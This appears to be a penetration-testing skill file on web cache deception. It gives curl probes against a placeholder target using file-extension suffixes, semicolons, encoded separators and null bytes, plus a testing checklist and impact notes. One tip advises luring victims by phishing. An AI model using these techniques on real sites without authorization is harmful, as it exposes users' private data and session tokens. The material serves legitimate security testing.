---
name: web-cache-deception
description: Web cache deception attacks exploiting path confusion between caches and origins to serve authenticated content to attackers
---

# Web Cache Deception

Web cache deception tricks a cache into storing authenticated, user-specific responses as public cached content. Unlike cache poisoning (which modifies cached content), cache deception serves legitimate but private content to unauthorized users.

## Attack Surface

- Applications behind CDN or reverse proxy caches
- Endpoints returning user-specific data (profile, settings, dashboard)
- Caches that make caching decisions based on file extension or path suffix

## Key Vulnerabilities

### Path Confusion (Static Extension Trick)

```bash
# Cache treats /account/settings/nonexistent.css as cacheable static file
# Origin serves /account/settings (ignoring path suffix) with auth content

# Send victim to: https://TARGET/account/settings/anything.css
# Cache stores response (thinks it's CSS)
# Attacker requests: https://TARGET/account/settings/anything.css
# Gets cached authenticated content!

# Test path suffix handling
curl -sk "https://TARGET/account/settings/test.css" -D - | head -20
curl -sk "https://TARGET/account/settings/test.js" -D - | head -20
curl -sk "https://TARGET/account/settings/test.png" -D - | head -20
curl -sk "https://TARGET/account/settings/x.woff" -D - | head -20

# Compare with normal response
curl -sk "https://TARGET/account/settings" -D - | head -20

# If same content returned → path suffix ignored by origin → deception possible
```

### Path Parameter Confusion

```bash
# Semicolon path parameters (Java/Tomcat)
curl -sk "https://TARGET/account/settings;cachebust.css" -D -
# Origin processes /account/settings, cache sees .css extension

# Encoded path separators
curl -sk "https://TARGET/account/settings%2F..%2Ftest.css" -D -
curl -sk "https://TARGET/account/settings%23anything.css" -D -
curl -sk "https://TARGET/account/settings%3Fanything.css" -D -
```

### Delimiter-based Confusion

```bash
# Null byte truncation
curl -sk "https://TARGET/account/settings%00.css" -D -

# Dot segments
curl -sk "https://TARGET/static/../account/settings" -D -

# Double encoding
curl -sk "https://TARGET/account/settings%252Ftest.css" -D -
```

## Testing Methodology

1. **Identify cacheable suffixes** — test `.css`, `.js`, `.png`, `.svg`, `.woff` appended to authenticated pages
2. **Compare responses** — if authenticated page content is returned for suffixed URL, cache may be deceived
3. **Check cache headers** — verify `X-Cache: HIT` on second request to the deceptive URL
4. **Test without auth** — access the cached URL without cookies, confirm private data is served
5. **Test path parameters** — semicolons, encoded slashes, null bytes as alternative path separators

## Validation

1. Authenticated content (user profile, email, token) cached and served to unauthenticated request
2. X-Cache shows HIT for request without authentication cookies
3. Victim's private data visible to attacker via cached URL

## Impact

- **High**: PII disclosure — attacker retrieves victim's profile, email, API keys from cache
- **High**: Session/token theft if tokens appear in cached responses
- **Medium**: Business data exposure from cached dashboard/admin pages

## Pro Tips

1. The victim must visit the deceptive URL first (send via phishing, link embedding) to populate the cache
2. CDNs like Cloudflare, Akamai, Fastly all cache based on file extension by default
3. Test ALL static extensions — `.css`, `.js`, `.png`, `.jpg`, `.ico`, `.svg`, `.woff`, `.json`
4. Java/Tomcat semicolon parameters are the most reliable path confusion technique
5. Check if the cache TTL is long enough to be practically exploitable (> 30 seconds)
6. Web cache deception is different from cache poisoning — deception serves real content, poisoning serves modified content
